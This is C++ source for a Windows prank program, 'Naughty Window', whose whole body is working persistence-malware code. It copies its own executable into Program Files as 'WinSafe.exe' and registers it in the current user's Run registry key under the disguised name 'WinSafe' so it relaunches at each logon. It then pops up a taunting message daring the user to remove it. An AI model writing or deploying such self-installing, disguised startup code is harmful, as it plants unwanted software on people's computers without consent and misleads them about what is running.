#ifndef UNICODE
#define UNICODE
#endif 

#include <windows.h>
#include <string>
#include <iostream>
#include <strsafe.h>

using namespace std;

bool dirExists(LPCWSTR dirName_in)
{
	DWORD ftyp = GetFileAttributes(dirName_in);
	if (ftyp == INVALID_FILE_ATTRIBUTES)
		return false;  //something is wrong with your path!

	if (ftyp & FILE_ATTRIBUTE_DIRECTORY)
		return true;   // this is a directory!

	return false;    // this is not a directory!
}

bool fileExists(LPCWSTR dirName_in)
{
	DWORD ftyp = GetFileAttributes(dirName_in);
	return (ftyp != INVALID_FILE_ATTRIBUTES &&
		!(ftyp & FILE_ATTRIBUTE_DIRECTORY));
}

int ErrorExit(LPCWSTR lpszFunction)
{
	// Retrieve the system error message for the last-error code

	LPVOID lpMsgBuf;
	LPVOID lpDisplayBuf;
	DWORD dw = GetLastError();

	FormatMessage(
		FORMAT_MESSAGE_ALLOCATE_BUFFER |
		FORMAT_MESSAGE_FROM_SYSTEM |
		FORMAT_MESSAGE_IGNORE_INSERTS,
		NULL,
		dw,
		MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
		(LPTSTR)&lpMsgBuf,
		0, NULL);

	// Display the error message and exit the process

	lpDisplayBuf = (LPVOID)LocalAlloc(LMEM_ZEROINIT,
		(lstrlen((LPCTSTR)lpMsgBuf) + lstrlen((LPCTSTR)lpszFunction) + 40) * sizeof(TCHAR));
	StringCchPrintf((LPTSTR)lpDisplayBuf,
		LocalSize(lpDisplayBuf) / sizeof(TCHAR),
		TEXT("%s failed with error %d: %s"),
		lpszFunction, dw, lpMsgBuf);
	MessageBox(NULL, (LPCTSTR)lpDisplayBuf, TEXT("Error"), MB_OK);

	LocalFree(lpMsgBuf);
	LocalFree(lpDisplayBuf);
	ExitProcess(dw);
	return dw;
}

void showMessageBox(LPCWSTR msg) {
	int msgboxID = MessageBox(
		NULL,
		msg,
		(LPCWSTR)L"Naughty Window / Nadav Halahmi",
		MB_OK
	);

	switch (msgboxID)
	{
	case IDOK:
		break;
	}
}

int copyToNewLocation(LPWSTR newLocation) {
	wchar_t filename[MAX_PATH];
	BOOL stats = 0;
	DWORD size = GetModuleFileName(NULL, filename, MAX_PATH);
	auto status = CopyFile(filename, newLocation, stats);
	if (fileExists(newLocation)) return 0;
	if (!status) return ErrorExit(L"CopyFile");
	return 0;
}

int writeToRegistry(LPWSTR newLocation) {
	LPCWSTR sk = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
	HKEY default_key;
	auto status = RegCreateKeyEx(HKEY_CURRENT_USER, sk, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &default_key, NULL);
	if (status != ERROR_SUCCESS) return ErrorExit(L"RegCreateKeyEx");
	wstring path = L"\"" + wstring(newLocation) + L"\"";
	status = RegSetValueEx(default_key, L"WinSafe", 0, REG_SZ, (LPCBYTE)path.c_str(), path.size() * sizeof(wchar_t) + 1);
	RegCloseKey(default_key);
	return 0;
}

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE, PWSTR pCmdLine, int nCmdShow)
{
	wchar_t newLocation[MAX_PATH] = L"C:\\Program Files\\WinSafe\\";
	if (!dirExists(newLocation))
		CreateDirectory(newLocation, NULL);
	lstrcat(newLocation, L"WinSafe.exe");
	copyToNewLocation(newLocation);
	writeToRegistry(newLocation);
	//while (1) {
	Sleep(10000);
	showMessageBox(L"Can you remove me?\nClosing me is not good enough, I will pop some other time...");
	//}

	return 0;
}

